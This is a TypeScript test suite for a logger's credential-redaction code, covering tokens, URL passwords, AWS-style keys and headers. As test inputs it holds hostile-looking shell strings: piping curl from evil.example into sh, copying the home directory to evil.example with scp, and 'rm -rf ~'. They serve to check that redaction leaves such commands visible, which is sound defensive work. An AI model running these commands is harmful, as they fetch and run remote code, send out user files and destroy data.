import { randomBytes } from 'node:crypto'
import { setTimeout as delay } from 'node:timers/promises'
import { describe, expect, it } from 'vitest'
import { createLogger, createOperationScope, isCredentialKey, isCredentialParameter, redactCredentials, redactText, redactUrlParameters, runInScope, type LogEvent, type LoggerConfig, type LogSink } from '../../src/index.js'

function memorySink(): LogSink & { events: LogEvent[] } {
  const events: LogEvent[] = []
  return { name: 'memory', events, write: (event) => { events.push(event) } }
}

async function logOnce(fields: Record<string, unknown>, options: { omitKeys?: string[]; message?: string } = {}): Promise<LogEvent> {
  const sink = memorySink()
  const root = createLogger({ component: 'test', sinks: [sink], omitKeys: options.omitKeys })
  root.logger.info(options.message ?? 'event', fields)
  await root.flush()
  return sink.events[0]!
}

const BASE64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
// AWS example keys use the base64 letters, digits and '/' without '+'.
const AWS_SECRET = BASE64.replace('+', '')

function seededRandom(seed: number): () => number {
  let state = seed
  return () => {
    state = (state + 0x6d2b79f5) | 0
    let mixed = Math.imul(state ^ (state >>> 15), 1 | state)
    mixed = (mixed + Math.imul(mixed ^ (mixed >>> 7), 61 | mixed)) ^ mixed
    return ((mixed ^ (mixed >>> 14)) >>> 0) / 4_294_967_296
  }
}

// Four shapes in turn: base64 or AWS alphabet, 40 random characters or '/' plus 39.
function randomKeys(count: number): string[] {
  const random = seededRandom(20_260_927)
  const pick = (alphabet: string, length: number) => Array.from({ length }, () => alphabet[Math.floor(random() * alphabet.length)]).join('')
  return Array.from({ length: count }, (_, index) => {
    const alphabet = index % 2 === 0 ? BASE64 : AWS_SECRET
    return index % 4 < 2 ? pick(alphabet, 40) : `/${pick(alphabet, 39)}`
  })
}

describe('logger shapes and limits (review M4)', () => {
  it('omits byte views with their size', async () => {
    const event = await logOnce({ chunk: Buffer.alloc(3_000), view: new Uint8Array(12), raw: new ArrayBuffer(7) })
    expect(event.fields).toEqual({ chunk: '[omitted 3000 bytes]', view: '[omitted 12 bytes]', raw: '[omitted 7 bytes]' })
  })

  it('caps keys per object and bytes per event', async () => {
    const wide = Object.fromEntries(Array.from({ length: 20_000 }, (_, index) => [`k${index}`, index]))
    const event = await logOnce({ wide })
    expect(Object.keys(event.fields!.wide as object).length).toBeLessThanOrEqual(101)
    expect(JSON.stringify(event).length).toBeLessThan(70_000)

    const heavy = Object.fromEntries(Array.from({ length: 100 }, (_, index) => [`k${index}`, 'x'.repeat(8_000)]))
    const capped = await logOnce({ heavy })
    expect(JSON.stringify(capped).length).toBeLessThan(70_000)
    expect(capped.fields).toEqual({ '[truncated]': expect.stringContaining('exceeded') })
  })

  it('redacts secret-named query parameters and URL passwords inside strings', async () => {
    const event = await logOnce({ url: 'https://api.example.com/v1?token=abc123&page=2', note: 'fetch https://user:hunter2@example.com/x?api_key=zzz9 failed' }, { message: 'GET https://example.com/cb?code=1&access_token=qqq7' })
    const serialized = JSON.stringify(event)
    for (const secret of ['abc123', 'hunter2', 'zzz9', 'qqq7']) expect(serialized).not.toContain(secret)
    expect(event.fields!.url).toContain('page=2')
  })

  it('redacts header tuple arrays and Headers objects by name', async () => {
    const event = await logOnce({ headers: [['x-api-key', 'k1'], ['accept', 'json']], fetched: new Headers({ authorization: 'Bearer zz', accept: 'json' }) })
    expect(event.fields).toEqual({ headers: [['x-api-key', '[redacted]'], ['accept', 'json']], fetched: { authorization: '[redacted]', accept: 'json' } })
  })

  it('omits keys named in omitKeys', async () => {
    const event = await logOnce({ input: 'user prompt text', text: 'model reply' }, { omitKeys: ['input', 'text'] })
    expect(event.fields).toEqual({ input: '[omitted 16 bytes]', text: '[omitted 11 bytes]' })
  })
})

describe('logger keeps useful data (review M5)', () => {
  it('keeps token counts, file paths, stack paths and git SHAs', async () => {
    const path = '/home/user/projects/buckle/packages/runtime/src/logger/sanitize.ts'
    const sha = '6ec41b3a1f2e4d5c6b7a8f9e0d1c2b3a4f5e6d7c'
    const event = await logOnce({ inputTokens: 1_200, outputTokens: 30, file: path, commit: sha }, { message: `at ${path}:12:3 in ${sha}` })
    expect(event.fields).toEqual({ inputTokens: 1_200, outputTokens: 30, file: path, commit: sha })
    expect(event.message).toBe(`at ${path}:12:3 in ${sha}`)
  })

  it('still redacts secret-named keys by word', async () => {
    const sha = '6ec41b3a1f2e4d5c6b7a8f9e0d1c2b3a4f5e6d7c'
    const event = await logOnce({ accessToken: 'a', auth: 'b', apiKey: 'c', client_secret: 'd', webhookSecret: sha, sessionToken: 'e' })
    expect(Object.values(event.fields!)).toEqual(Array(6).fill('[redacted]'))
  })
})

describe('secret keys and opaque values (logger-fixes-1, logger-fixes-2)', () => {
  it('redacts plural and run-together secret key names while token counts stay numbers', async () => {
    const secretKeys = ['tokens', 'secrets', 'cookies', 'passwords', 'apiKeys', 'api_keys', 'accessTokens', 'refreshTokens', 'accesstoken', 'authtoken', 'csrftoken', 'clientsecret', 'secretkey', 'newpassword', 'PGPASSWORD', 'credentials']
    const countKeys = ['inputTokens', 'outputTokens', 'input_tokens', 'maxTokens', 'max_tokens', 'totalTokenCount', 'tokenCount', 'token_count', 'cachedInputTokens']
    const event = await logOnce({ ...Object.fromEntries(secretKeys.map(key => [key, 'short-opaque-19char'])), ...Object.fromEntries(countKeys.map((key, index) => [key, index])) })
    expect(Object.fromEntries(secretKeys.map(key => [key, event.fields![key]]))).toEqual(Object.fromEntries(secretKeys.map(key => [key, '[redacted]'])))
    expect(Object.fromEntries(countKeys.map(key => [key, event.fields![key]]))).toEqual(Object.fromEntries(countKeys.map((key, index) => [key, index])))
  })

  it('redacts base64 and AWS-style secrets that contain a slash, in fields and messages', async () => {
    const aws = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
    const base64 = 'K7gNU3sdo+OL0wNhqoVWhr3g6s1xYv72ol/pe/Unols='
    const leadingSlash = '/7gNU3sdo+OL0wNhqoVWhr3g6s1xYv72ol/pe/Unols='
    const accountKey = `${'Ab3/'.repeat(21)}Zz==`
    const event = await logOnce({ note: `k=${aws}`, cmd: `aws configure set aws_secret_access_key ${aws}`, b64: `k=${base64}`, slash: leadingSlash, azure: `DefaultEndpointsProtocol=https;AccountKey=${accountKey};EndpointSuffix=core.windows.net` }, { message: `retrying with ${base64}` })
    const serialized = JSON.stringify(event)
    for (const secret of [aws, base64, leadingSlash, accountKey, 'K7MDENG', 'pe/Unols']) expect(serialized).not.toContain(secret)
  })

  it('redacts singular token keys whatever the prefix; a count needs a numeric value under a plural count word', async () => {
    const singular = ['cacheToken', 'contextToken', 'inputToken', 'maxToken', 'cache_token', 'token']
    const counts = { max_tokens: '4096', tokenLimit: 8_000, tokenBudget: 100, tokenUsage: 7, promptTokenTotal: 12 }
    const event = await logOnce({ ...Object.fromEntries(singular.map(key => [key, 1_024])), ...counts, inputTokens: 'abc123', totalTokens: { input: 1 } }, { message: 'GET /v1/chat?max_tokens=4096&input_token=1234' })
    expect(Object.fromEntries(singular.map(key => [key, event.fields![key]]))).toEqual(Object.fromEntries(singular.map(key => [key, '[redacted]'])))
    expect(event.fields).toMatchObject({ ...counts, inputTokens: '[redacted]', totalTokens: '[redacted]' })
    expect(event.message).toBe('GET /v1/chat?max_tokens=4096&input_token=[redacted]')
  })

  it('redacts 5000 random 40-character base64 and AWS-style keys, with and without a leading slash', () => {
    const survivors = randomKeys(5_000).filter(key => redactText(`retrying with ${key}`).includes(key))
    expect(survivors.length).toBe(0)
  })

  it('keeps short paths, stack frames, hashed chunk names, camel-case paths and git SHAs readable', () => {
    const readable = [
      '/usr/lib/node_modules/x',
      '/tmp/a.txt',
      '    at runRequestInScope (file:///home/user/projects/buckle/packages/runtime/src/nitro/guards.ts:125:29)',
      'at connect (/srv/app/node_modules/@modelcontextprotocol/server/dist/src-STyD_Vvf.cjs:1:2)',
      '/srv/app/.output/server/chunks/routes/api/v1/workspaces-Bx3dK9aZ.mjs',
      'src/components/UserProfileCard2/settings/index.vue',
      '6ec41b3a1f2e4d5c6b7a8f9e0d1c2b3a4f5e6d7c',
    ]
    expect(readable.map(redactText)).toEqual(readable)
  })

  // Review H4 of B23-B25: the process log names the key that signed a setup change or an approval.
  it('keeps a public key fingerprint readable after SHA256:, and still redacts the same run anywhere else', async () => {
    const fingerprint = 'SHA256:q3Xz_9-kLmNoPqRsTuVwXyZaBcDeFgHiJkLmNoPqRsT'
    expect(fingerprint.length).toBe(7 + 43)
    const event = await logOnce({ actor: `key:${fingerprint}` }, { message: `Approved by key:${fingerprint}` })
    expect(event.fields).toEqual({ actor: `key:${fingerprint}` })
    expect(event.message).toBe(`Approved by key:${fingerprint}`)
    const run = fingerprint.slice(7)
    expect(redactText(`secret ${run}`)).toBe('secret [redacted]')
    expect(redactText(`SHA256:${run}extra`)).toBe('SHA256:[redacted]')
    expect(redactText(`SHA1:${run}`)).toBe('SHA1:[redacted]')
    // Random secrets still go, whatever precedes them, unless they are exactly a fingerprint after SHA256:.
    const survivors = randomKeys(2_000).filter(key => redactText(`token ${key}`).includes(key))
    expect(survivors.length).toBe(0)
  })

  // Review item 20 of the proof-of-possession fixes: about 1 in 28,000 random fingerprints held an sk_, pk- or
  // hex run that an earlier pass cut before the fingerprint was recognised.
  it('keeps every key fingerprint whole, whatever runs its 43 characters hold', async () => {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
    const fill = (length: number) => Array.from(randomBytes(length), byte => alphabet[byte % 64]).join('')
    const crafted = ['sk_', 'sk-', 'pk_', 'pk-', 'rk_', 'ghp_', 'gho_', 'ghs_', 'xoxb-', 'eyJ'].flatMap(prefix => [
      `${prefix}${fill(43 - prefix.length)}`, `${fill(10)}-${prefix}${fill(32 - prefix.length)}`,
    ])
    const hex = Array.from({ length: 20 }, () => randomBytes(22).toString('hex').slice(0, 43))
    const random = Array.from({ length: 20_000 }, () => fill(43))
    const altered = [...crafted, ...hex, ...random].map(body => `SHA256:${body}`).filter(fingerprint => redactText(`Approved by key:${fingerprint}.`) !== `Approved by key:${fingerprint}.`)
    expect(altered).toEqual([])
    const fingerprint = `SHA256:sk_${fill(40)}`
    const event = await logOnce({ actor: `key:${fingerprint}`, token: fingerprint }, { message: `key:${fingerprint} decided` })
    expect(event.fields).toEqual({ actor: `key:${fingerprint}`, token: '[redacted]' })
    expect(event.message).toBe(`key:${fingerprint} decided`)
  })

  // Review L10 of the second proof-of-possession re-review: the set-aside kept a fingerprint-shaped value after
  // Bearer or under a credential parameter, and one touching a longer base64 run.
  it('redacts a fingerprint-shaped credential where its context names one, and sets aside only a whole fingerprint', () => {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
    const fill = (length: number) => Array.from(randomBytes(length), byte => alphabet[byte % 64]).join('')
    const shaped = Array.from({ length: 2_000 }, () => `SHA256:${fill(43)}`)
    const contexts = (value: string) => [`Authorization: Bearer ${value}`, `Basic ${value}`, `GET https://api.example.com/x?token=${value}`, `https://api.example.com/x?access_token=${value}&y=1`, `https://bot:${value}@github.com/org/repo.git`]
    const kept = shaped.flatMap(value => contexts(value).filter(text => redactText(text).includes(value.slice(7))))
    expect(kept).toEqual([])
    const [fingerprint] = shaped
    for (const touching of [`x${fingerprint}`, `+${fingerprint}`, `${fingerprint}=`, `${fingerprint}+tail`, `${fingerprint}/tail`]) expect(redactText(`seen ${touching}`)).not.toContain(fingerprint!.slice(7))
    expect(redactText(`Approved by key:${fingerprint}, (${fingerprint}).`)).toBe(`Approved by key:${fingerprint}, (${fingerprint}).`)
  })

  // Review L7 of the second proof-of-possession re-review.
  it('names a camel-case split of a credential word, as 5036e49 did for passWord and PassWord', () => {
    for (const name of ['passWord', 'PassWord', 'passPhrase', 'userPassWord', 'db_passWord', 'sigNature']) expect({ name, credential: isCredentialKey(name, 'x') }).toEqual({ name, credential: true })
    for (const name of ['passage', 'wordCount', 'compass', 'bypass']) expect({ name, credential: isCredentialKey(name, 'x') }).toEqual({ name, credential: false })
  })

  it('redacts URL userinfo to the last @ of its authority, and credential parameters in its query', () => {
    // Review L7: a bare token used as userinfo, with no ':', as Node's fetch error names a credentialed URL.
    expect(redactText('fetch failed for https://bare-userinfo-word@github.com/org/repo.git')).toBe('fetch failed for https://[redacted]@github.com/org/repo.git')
    expect(redactText('open https://bare-userinfo-word@host.example?x=1')).toBe('open https://[redacted]@host.example?x=1')
    expect(redactText('clone https://user:p@ss@word@host.example/org/repo.git')).toBe('clone https://[redacted]@host.example/org/repo.git')
    expect(redactText('mail me@example.com about https://host.example/a@b')).toBe('mail me@example.com about https://host.example/a@b')
    expect(redactUrlParameters('https://api.example.com/x?access_token=abc&key=def&sig=ghi&page=2#code=jkl')).toBe('https://api.example.com/x?access_token=[redacted]&key=[redacted]&sig=[redacted]&page=2#code=[redacted]')
    expect(isCredentialParameter('client_secret', 'x')).toBe(true)
    expect(isCredentialParameter('page', '2')).toBe(false)
  })

  // Slice 7b review R7B-CR-8: `pwd` named no credential, so a password passed as `?pwd=` showed in every context.
  it('redacts a pwd query parameter in a log line and in a URL', () => {
    expect(redactText('GET https://h.example/?pwd=p5ecret failed')).toBe('GET https://h.example/?pwd=[redacted] failed')
    expect(redactUrlParameters('https://h.example/?pwd=p5ecret&page=2')).toBe('https://h.example/?pwd=[redacted]&page=2')
    expect(isCredentialParameter('pwd', 'p5ecret')).toBe(true)
  })

  // Slice 7b review R7B-CR-5 (owner default N2 (a)): a comma ends a URL's authority in a log line, so a CSV row's
  // fields after a URL show; a `;` before other text still continues it.
  it.each([
    'payee,amount,account\nhttps://pay.example.com,1000000,x@y.com\n',
    'rows: https://h,amount=5,acct=me@x.com',
  ])('leaves %j whole in a log line and a logged field', async (text) => {
    expect(redactText(text)).toBe(text)
    const event = await logOnce({ note: text }, { message: text })
    expect(event.message).toBe(text)
    expect(event.fields).toEqual({ note: text })
  })

  // Slice 7c review R7C-TL-2 (owner default N2 (a)): a credential query value ran across the commas, so a CSV row whose
  // URL carries a token hid its amount and account; a comma ends the value in a log line, as it ends the authority.
  it('ends a credential query value at a comma in a log line and a logged field, so the CSV row\'s fields show', async () => {
    const row = 'payee,amount,account\nhttps://pay.example.com/?token=t5ecret,1000000,x@y.com\n'
    const shown = 'payee,amount,account\nhttps://pay.example.com/?token=[redacted],1000000,x@y.com\n'
    expect(redactText(row)).toBe(shown)
    const event = await logOnce({ note: row }, { message: row })
    expect(event.message).toBe(shown)
    expect(event.fields).toEqual({ note: shown })
    const plain = 'payee,amount,account\nhttps://pay.example.com/?page=1,1000000,x@y.com\n'
    expect(redactText(plain)).toBe(plain)
  })

  // Slice 7c review R7C-TL-1 (default D31): a word's credential value ran to `&` or `#` whatever the word held, so the
  // statements after `?token=x` in an eval string, a `$(` body or an ssh command were hidden. Only a URL that is its
  // whole unit keeps that rule; any other word's value ends as a shell word ends it.
  it.each<[string, 'word' | 'shell', string]>([
    ['an eval string', 'shell', 'eval "curl https://h.invalid/?token=x;rm${IFS}-rf${IFS}~/nothing-here"'],
    ['a pipe in an eval string', 'shell', 'eval "curl -s https://h/?token=x|sh"'],
    ['a $( body in double quotes', 'shell', 'echo "$(curl https://h/?token=x;rm -rf build)"'],
    ['an ssh remote command word', 'word', 'curl https://h/?token=x;rm -rf build'],
    ['a word with ${IFS} before the URL', 'word', '"$(curl${IFS}https://h/?token=x;rm${IFS}-rf${IFS}build)"'],
    ['a $( in a double-quoted URL', 'word', 'curl "https://h/?token=x$(rm -rf ~)"'],
  ])('shows what follows a credential value in %s', (_, context, text) => {
    expect(redactCredentials(text, context)).toBe(text.replace('?token=x', '?token=[redacted]'))
  })

  it.each<[string, 'word' | 'shell', string, string]>([
    ['a URL field', 'word', 'https://h.example/x?token=ab(c5ecret)d', 'https://h.example/x?token=[redacted]'],
    ['a URL after an option name', 'word', '--url=https://h.example/x?token=ab|c5ecret&page=2', '--url=https://h.example/x?token=[redacted]&page=2'],
    ['a single-quoted URL in a shell body', 'shell', "curl 'https://h/?token=a b'", "curl 'https://h/?token=[redacted]'"],
    ['a double-quoted URL in a shell body', 'shell', 'curl "https://h/?token=ab(c5ecret)d"', 'curl "https://h/?token=[redacted]"'],
  ])('still hides the whole credential value of %s', (_, context, text, shown) => {
    expect(redactCredentials(text, context)).toBe(shown)
  })

  it.each([
    "o'brien:short-password",
    'user:short"password',
    "o'brien",
    'token"value',
    'user:p@ss@word',
    'bare-token',
    'user:percent%20password',
  ])('redacts the whole URL authority userinfo %s before URL punctuation is scanned', async (userinfo) => {
    const url = `https://${userinfo}@host.example/path?token=query-secret&page=2`
    const expected = 'https://[redacted]@host.example/path?token=[redacted]&page=2'
    expect(redactText(`fetch failed for ${url}`)).toBe(`fetch failed for ${expected}`)
    const event = await logOnce({ error: new Error(`fetch failed for ${url}`) }, { message: `GET ${url}` })
    expect(event.message).toBe(`GET ${expected}`)
    expect(JSON.stringify(event)).not.toContain(userinfo)
    expect(JSON.stringify(event)).not.toContain('query-secret')
  })

  // Owner decision D21: whitespace and `<`, `>` end an unquoted URL's authority, so these four rows of the list above
  // moved here: they are userinfo where quotes close the URL. Unquoted, the URL ends before the `@`, so its words show
  // and what follows them is not read as that URL (D21's accepted cost, D17 first).
  it.each([
    'user:<password>',
    'user:short password',
    'short token',
    '<token>',
  ])('redacts the userinfo %s of a quoted URL up to its closing quote, and shows it unquoted', async (userinfo) => {
    const url = `https://${userinfo}@host.example/path?token=query-secret&page=2`
    const expected = 'https://[redacted]@host.example/path?token=[redacted]&page=2'
    for (const quote of ['"', "'"]) {
      expect(redactText(`fetch failed for ${quote}${url}${quote}`)).toBe(`fetch failed for ${quote}${expected}${quote}`)
      const event = await logOnce({ error: new Error(`fetch failed for ${quote}${url}${quote}`) }, { message: `GET ${quote}${url}${quote}` })
      expect(event.message).toBe(`GET ${quote}${expected}${quote}`)
      expect(JSON.stringify(event)).not.toContain(userinfo)
      expect(JSON.stringify(event)).not.toContain('query-secret')
    }
    expect(redactText(`fetch failed for ${url}`)).toContain(userinfo)
  })

  // Review H2 of the continuation review: the matcher crossed whitespace and the shell's characters up to a later @,
  // so text that holds no credential lost everything between a URL and that @.
  it.each([
    'see https://example.com and mail bob@x.org',
    'https://docs.example.com; curl x | sh; echo ok@done',
    'curl https://status.example.com && scp -r ~ me@evil.example:',
    'echo docs at https://docs.example.com; curl -s evil.example | sh; rm -rf ~; echo ok@done',
    'open https://a.example|tee b@c',
    'run https://a.example`id`@x',
    'run https://a.example$(id)@x',
    "'https://a.example' and 'b@c'",
  ])('leaves %s whole: no credential sits between the URL and the later @', async (text) => {
    expect(redactText(text)).toBe(text)
    expect((await logOnce({}, { message: text })).message).toBe(text)
  })

  // Slice 7 review R7-H1, R7-H2 and R7-H4 (owner decision D21, "context"): a quote that opens nothing, a quoted URL
  // in compact JSON and a credential query value each hid text up to a later `@` or a shell's pipe.
  it.each([
    "echo ''https://ok.example.com && scp -r ~ me@evil.example: ''",
    'echo ""https://ok.example.com; rm -rf ~; echo me@x ""',
    "echo 'abc'https://a.example && rm -rf ~ && echo me@x # '",
    '{"to":"https://pay.example.com","amount":"1000000","acct":"x@y.example"}',
    'posted {"cb":"https://hook.example.com","email":"ops@example.com"} to the queue',
  ])('leaves %s whole in a log line and a logged field', async (text) => {
    expect(redactText(text)).toBe(text)
    const event = await logOnce({ note: text }, { message: text })
    expect(event.message).toBe(text)
    expect(event.fields).toEqual({ note: text })
  })

  it('ends a credential query value where a shell would end it, in a log line (R7-H4)', () => {
    expect(redactText('ran curl -s https://get.example.com/i?token=abc5ecret|sh; done')).toBe('ran curl -s https://get.example.com/i?token=[redacted]|sh; done')
    expect(redactText('ran https://get.example.com/i?token=abc5ecret$(id) and https://h.example/?sig=s5ecret`id`')).toBe('ran https://get.example.com/i?token=[redacted]$(id) and https://h.example/?sig=[redacted]`id`')
    expect(redactText("fetched 'https://h.example/?token=abc 5ecret&page=2'")).toBe("fetched 'https://h.example/?token=[redacted]&page=2'")
  })

  // Slice 7 review R7-H3: shell characters ended every userinfo, so these passwords showed in the log.
  it.each([
    'postgres://app:pa$$w0rd5ecret@db.internal:5432/app',
    'redis://default:s3cr&t5ecret@cache:6379',
    'https://deploy:Xy(7)k!q5ecret@registry.example/v2/',
    'https://u:p$5ecret&x(y)!;z@host.example/path',
  ])('redacts the whole userinfo of %s in a log line, a logged field and a JSON message', async (url) => {
    const redacted = url.replace(/^([a-z]+:\/\/)[^@]*@/, '$1[redacted]@')
    expect(redactText(`connect ${url} failed`)).toBe(`connect ${redacted} failed`)
    const event = await logOnce({ target: url }, { message: JSON.stringify({ url, retry: 'ok@later' }) })
    expect(event.fields).toEqual({ target: redacted })
    expect(event.message).toBe(JSON.stringify({ url: redacted, retry: 'ok@later' }))
    expect(JSON.stringify(event)).not.toContain('5ecret')
  })

  // One matcher for every redaction by name: Buckle's approval challenges use it too (review item 8 of the proof-of-possession fixes).
  it('names credential headers and variables in any case, and keeps counts and plain names', () => {
    for (const name of ['Authorization', 'Proxy-Authorization', 'Cookie', 'Set-Cookie', 'X-Api-Key', 'api-key', 'Bearer', 'x-auth', 'NPM_AUTH', 'PASSPHRASE', 'SIGNATURE', 'private-key', 'GITHUB_TOKEN', 'PGPASSWORD', 'client_secret']) {
      expect({ name, credential: isCredentialKey(name) }).toEqual({ name, credential: true })
    }
    for (const name of ['path', 'content', 'url', 'PWD', 'HOME', 'Accept']) expect({ name, credential: isCredentialKey(name) }).toEqual({ name, credential: false })
    expect(isCredentialKey('max_tokens', 1000)).toBe(false)
    expect(isCredentialKey('max_tokens', 'sk-live-abc')).toBe(true)
  })

  it('keeps absolute and relative paths and stack frames readable', async () => {
    const relative = 'packages/runtime/test/fixture/layers/common/server/routes/v1/database/baked'
    const frame = 'at runRequestInScope (file:///home/user/projects/buckle/packages/runtime/src/nitro/guards.ts:125:29)'
    const event = await logOnce({ relative, frame, dir: '/home/user/.5straps/buckle/workspaces/2f9c1d/history' })
    expect(event.fields).toEqual({ relative, frame, dir: '/home/user/.5straps/buckle/workspaces/2f9c1d/history' })
  })
})

describe('event size and hex runs (logger-fixes-4, logger-fixes-5)', () => {
  function bigError(index: number, depth = 0): Error {
    const error = new Error(`failure ${index} ${'m'.repeat(9_000)}`, depth < 2 ? { cause: bigError(index, depth + 1) } : undefined)
    error.stack = `${error.message}\n${'    at frame (/srv/app/file.js:1:1)\n'.repeat(400)}`
    return error
  }

  it('caps the whole event, error included, at maxEventBytes', async () => {
    const aggregate = new AggregateError(Array.from({ length: 50 }, (_, index) => bigError(index)), 'batch failed')
    const nested = new AggregateError(Array.from({ length: 50 }, () => new AggregateError(Array.from({ length: 50 }, (_, index) => bigError(index)), 'inner')), 'outer')
    for (const error of [aggregate, nested]) {
      const event = await logOnce({ error, requestId: 'r-1' })
      expect(Buffer.byteLength(JSON.stringify(event))).toBeLessThanOrEqual(65_536 + 1_024)
      expect(event.error).toMatchObject({ name: 'AggregateError' })
      expect(event.fields).toMatchObject({ requestId: 'r-1' })
    }
  })

  it('redacts a 40-hex credential in free text while git SHAs stay readable', async () => {
    const hex = 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3'
    const event = await logOnce({ note: `retrying with client secret ${hex}`, pat: `pat ${hex}`, url: `https://api.example.com/cb?client=x&s=${hex}`, upper: hex.toUpperCase(), commit: hex, log: `HEAD is now at ${hex}` }, { message: `token ${hex} rejected` })
    expect(event.message).toBe('token [redacted] rejected')
    expect(event.fields).toMatchObject({ note: 'retrying with client secret [redacted]', pat: 'pat [redacted]', upper: '[redacted]', commit: hex, log: `HEAD is now at ${hex}` })
    expect(String(event.fields!.url)).not.toContain(hex)
  })
})

describe('sink recursion across awaits (review M6)', () => {
  it('sends a log line from inside an async sink to the fallback only', async () => {
    const fallback: string[] = []
    let writes = 0
    let root: ReturnType<typeof createLogger> | undefined
    const sink: LogSink = { name: 'async', async write() {
      writes += 1
      await delay(1)
      root!.logger.info('from inside the sink')
    } }
    root = createLogger({ component: 'svc', sinks: [sink], fallback: line => fallback.push(line) })
    root.logger.info('one')
    await delay(20)
    await root.flush()
    expect(writes).toBe(1)
    expect(fallback.filter(line => line.includes('from inside the sink'))).toHaveLength(1)
  })
})

describe('close and drops (review L3)', () => {
  it('drops and counts events logged once close has started', async () => {
    const sink = memorySink()
    const root = createLogger({ component: 'svc', sinks: [sink] })
    root.logger.info('before')
    const closing = root.close()
    root.logger.info('during close')
    await closing
    root.logger.info('after close')
    expect(sink.events.map(event => event.message)).toEqual(['before'])
    expect(root.stats().dropped).toBe(2)
  })

  it('emits one warning event when drops start and one with the count once the queue drains', async () => {
    const sink = memorySink()
    const root = createLogger({ component: 'svc', sinks: [sink], queueLimit: 5 })
    for (let index = 0; index < 8; index += 1) root.logger.info(`event ${index}`)
    await root.flush()
    expect(sink.events.filter(event => event.level === 'warn')).toEqual([expect.objectContaining({ message: 'log events dropped: queue full' }), expect.objectContaining({ message: 'log events dropped: queue drained', fields: { queueLimit: 5, dropped: 3 } })])
    expect(root.stats().dropped).toBe(3)
  })
})

describe('logger lows (logger-fixes-3, -6, -7, -8, -9, -11, -12, -13)', () => {
  it('logger-fixes-3 redacts credentials in any URL scheme, fragments and bare request targets', async () => {
    const token = 'tok_9f8e7d6c5b4a'
    const event = await logOnce({
      wss: `wss://user:${token}@ws.example.com/?token=${token}`,
      target: `/api/callback?access_token=${token}&state=ok`,
      fragment: `https://app.example.com/cb#access_token=${token}&expires_in=3600`,
      dsn: `postgres://admin:${token}@db.internal/app`,
      google: `https://maps.example.com/api?key=${token}`,
      sas: `https://blob.example.com/c?sv=2024&sig=${token}`,
    })
    expect(JSON.stringify(event)).not.toContain(token)
    expect(event.fields).toMatchObject({ target: '/api/callback?access_token=[redacted]&state=ok', fragment: 'https://app.example.com/cb#access_token=[redacted]&expires_in=3600', dsn: 'postgres://[redacted]@db.internal/app' })
  })

  it('logger-fixes-9 rewrites only the secret value, keeping punctuation and other parameters as written', async () => {
    const event = await logOnce({ note: 'see (https://x.example/?token=abc123&q=a%20b).' })
    expect(event.fields!.note).toBe('see (https://x.example/?token=[redacted]&q=a%20b).')
  })

  it('logger-fixes-6 omits body and content fields by their last key word', async () => {
    const event = await logOnce({ requestBody: 'secret file', responseBody: 'reply', fileContents: 'text', toolPayload: '{}', bodyLength: 12 })
    expect(event.fields).toEqual({ requestBody: '[omitted 11 bytes]', responseBody: '[omitted 5 bytes]', fileContents: '[omitted 4 bytes]', toolPayload: '[omitted 2 bytes]', bodyLength: 12 })
  })

  it('logger-fixes-7 redacts secret-shaped object keys and header values in flat header arrays', async () => {
    const token = 'sk_live_0123456789abcdefghij'
    const event = await logOnce({ sessions: { [token]: 1 }, rawHeaders: ['Cookie', 'sid=abc', 'X-Api-Key', 'k-123', 'Accept', 'json'], header: ['x-api-key', 'k-456'] })
    expect(JSON.stringify(event)).not.toContain(token)
    expect(event.fields).toMatchObject({ rawHeaders: ['Cookie', '[redacted]', 'X-Api-Key', '[redacted]', 'Accept', 'json'], header: ['x-api-key', '[redacted]'] })
  })

  it('logger-fixes-8 keeps a flushing sink from feeding itself and lets another root log from inside a sink', async () => {
    const fallback: string[] = []
    const inner = memorySink()
    const innerRoot = createLogger({ component: 'http-client', sinks: [inner] })
    const outer = memorySink()
    let root: ReturnType<typeof createLogger> | undefined
    const flushing: LogSink = { name: 'flushing', write: async () => { innerRoot.logger.warn('reporter http failed') }, flush: () => { root!.logger.info('flushed') } }
    root = createLogger({ component: 'svc', sinks: [outer, flushing], fallback: line => fallback.push(line) })
    root.logger.error('boom')
    await root.flush()
    await innerRoot.flush()
    expect(outer.events.map(event => event.message)).toEqual(['boom'])
    expect(fallback.filter(line => line.includes('flushed'))).toHaveLength(1)
    expect(inner.events.map(event => event.message)).toEqual(['reporter http failed'])
  })

  it('logger-fixes-11 never throws into the caller for a field it cannot read', async () => {
    const sink = memorySink()
    const root = createLogger({ component: 'svc', sinks: [sink] })
    expect(() => root.logger.info('bad', { bad: { get x() { throw new Error('getter boom') } } })).not.toThrow()
    expect(() => root.logger.info({ not: 'a string' } as unknown as string)).not.toThrow()
    await root.flush()
    expect(sink.events[0]).toMatchObject({ message: 'bad', fields: { '[unloggable]': 'Error' } })
    expect(sink.events).toHaveLength(2)
  })

  it('logger-fixes-12 reports drops without a request correlation id, with the count, and respects the level', async () => {
    const sink = memorySink()
    const root = createLogger({ component: 'svc', sinks: [sink], queueLimit: 3 })
    const scope = createOperationScope({ owner: Symbol('t'), context: { correlationId: 'unrelated-request' } })
    runInScope(scope, () => { for (let index = 0; index < 8; index += 1) root.logger.info(`event ${index}`) })
    await root.flush()
    const warnings = sink.events.filter(event => event.level === 'warn')
    expect(warnings.map(event => [event.message, event.correlationId, event.fields])).toEqual([
      ['log events dropped: queue full', undefined, { queueLimit: 3 }],
      ['log events dropped: queue drained', undefined, { queueLimit: 3, dropped: 5 }],
    ])
    const quiet = memorySink()
    const errorsOnly = createLogger({ component: 'svc', sinks: [quiet], queueLimit: 1, level: 'error' })
    for (let index = 0; index < 4; index += 1) errorsOnly.logger.error(`failure ${index}`)
    await errorsOnly.flush()
    expect(quiet.events.filter(event => event.level === 'warn')).toEqual([])
  })

  it('logger-fixes-13 drops a multibyte character cut by truncation', async () => {
    const sink = memorySink()
    const root = createLogger({ component: 'svc', sinks: [sink], maxStringBytes: 5 })
    root.logger.info('x', { note: 'ab\u{1F600}cd' })
    await root.flush()
    expect(sink.events[0]!.fields!.note).toBe('ab...[truncated 3 bytes]')
  })
})

describe('content keys and logger config (ruling 8)', () => {
  it('drops input, text, prompt and messages by default, as a whole key or the last key word', async () => {
